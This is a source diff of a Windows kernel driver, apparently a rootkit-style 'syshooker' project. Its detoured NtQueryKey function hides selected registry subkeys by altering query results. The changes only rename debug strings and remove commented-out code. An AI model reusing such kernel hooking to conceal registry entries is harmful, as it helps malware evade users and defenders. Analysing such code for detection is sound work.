@@ -41,7 +41,7 @@ NTSTATUS DetourNtQueryKey(
 			NTSTATUS originalStatus = OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
 			if (NT_SUCCESS(originalStatus)) {
 				PKEY_CACHED_INFORMATION KeyCachedInformationPtr = (PKEY_CACHED_INFORMATION)KeyInformation;
-				//kprintf("[+] infinityhook: NtQueryKey KeyCachedInformation: SubKeys: %ul, MaxNameLen: %ul, Values: %ul, NameLength: %ul\n", KeyCachedInformationPtr->SubKeys, KeyCachedInformationPtr->MaxNameLen, KeyCachedInformationPtr->Values, KeyCachedInformationPtr->NameLength);
+				//kprintf("[+] syshooker: NtQueryKey KeyCachedInformation: SubKeys: %ul, MaxNameLen: %ul, Values: %ul, NameLength: %ul\n", KeyCachedInformationPtr->SubKeys, KeyCachedInformationPtr->MaxNameLen, KeyCachedInformationPtr->Values, KeyCachedInformationPtr->NameLength);
 
 				// now check if there are any subkeys that should be hidden
 				ULONG HideSubkeyIndexesCount = 0, OkSubkeyIndexesCount = 0;
@@ -54,7 +54,7 @@ NTSTATUS DetourNtQueryKey(
 					return originalStatus;
 				}
 
-				//kprintf("[+] infinityhook: NtQueryKey After Zw: Indexes count: %d, hide indexes count: %d\n", OkSubkeyIndexesCount, HideSubkeyIndexesCount);
+				//kprintf("[+] syshooker: NtQueryKey After Zw: Indexes count: %d, hide indexes count: %d\n", OkSubkeyIndexesCount, HideSubkeyIndexesCount);
 				
 				// !!! DO NOT FORGET TO FREE OkSubkeyIndexesPtr
 				ExFreePool(OkSubkeyIndexesPtr);
@@ -70,7 +70,7 @@ NTSTATUS DetourNtQueryKey(
 		NTSTATUS originalStatus = OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
 		if (NT_SUCCESS(originalStatus)) {
 			PKEY_FULL_INFORMATION KeyFullInformationPtr = (PKEY_FULL_INFORMATION)KeyInformation;
-			//kprintf("[+] infinityhook: NtQueryKey KeyFullInformation: SubKeys: %ul\n", KeyFullInformationPtr->SubKeys);
+			//kprintf("[+] syshooker: NtQueryKey KeyFullInformation: SubKeys: %ul\n", KeyFullInformationPtr->SubKeys);
 
 			// now check if there are any subkeys that should be hidden
 			ULONG HideSubkeyIndexesCount = 0, OkSubkeyIndexesCount = 0;
@@ -96,39 +96,4 @@ NTSTATUS DetourNtQueryKey(
 		return originalStatus;
 	}
 	else return OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
-	//if (KeyInformationClass == 3) {
-	//	NTSTATUS status = OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
-	//	if (NT_SUCCESS(status)) {
-	//		kprintf("[+] infinityhook: NtQueryKey, class %d, after successful call, ResultLength: %d\n", KeyInformationClass, *ResultLength);
-	//		PKEY_NAME_INFORMATION KeyNameInformationPtr = (PKEY_NAME_INFORMATION)KeyInformation;
-	//		kprintf("[+] infinityhook: NtQueryKey: NameLength: %d\n", KeyNameInformationPtr->NameLength);
-
-	//		wchar_t NameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-	//		for (size_t i = 0; i < KeyNameInformationPtr->NameLength && i < MAX_PATH_SYSHOOKER; ++i) {
-	//			NameBuffer[i] = KeyNameInformationPtr->Name[i];
-	//		}
-	//		kprintf("[+] infinityhook: NtQueryKey: Name: %ws\n", NameBuffer);
-	//	}
-	//	return status;
-	//}
-	//else if (KeyInformationClass == 4) {
-	//	NTSTATUS status = OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
-	//	if (NT_SUCCESS(status)) {
-	//		kprintf("[+] infinityhook: NtQueryKey, class %d, after successful call, ResultLength: %d\n", KeyInformationClass, *ResultLength);
-	//		PKEY_CACHED_INFORMATION KeyCachedInformationPtr = (PKEY_CACHED_INFORMATION)KeyInformation;
-	//		kprintf("[+] infinityhook: NtQueryKey: SubKeys: %ul, MaxNameLen: %ul, Values: %ul, NameLength: %ul\n", KeyCachedInformationPtr->SubKeys, KeyCachedInformationPtr->MaxNameLen, KeyCachedInformationPtr->Values, KeyCachedInformationPtr->NameLength);
-
-	//		/*wchar_t NameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-	//		for (size_t i = 0; i < KeyNameInformationPtr->NameLength && i < MAX_PATH_SYSHOOKER; ++i) {
-	//			NameBuffer[i] = KeyNameInformationPtr->Name[i];
-	//		}
-	//		kprintf("[+] infinityhook: NtQueryKey: Name: %ws\n", NameBuffer);*/
-	//	}
-	//	return status;
-	//}
-	//else {
-	//	//kprintf("[+] infinityhook: In Detoured NtQueryKey, class: %d\n", KeyInformationClass);
-	//	// call the original
-	//	//return OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
-	//}
 }
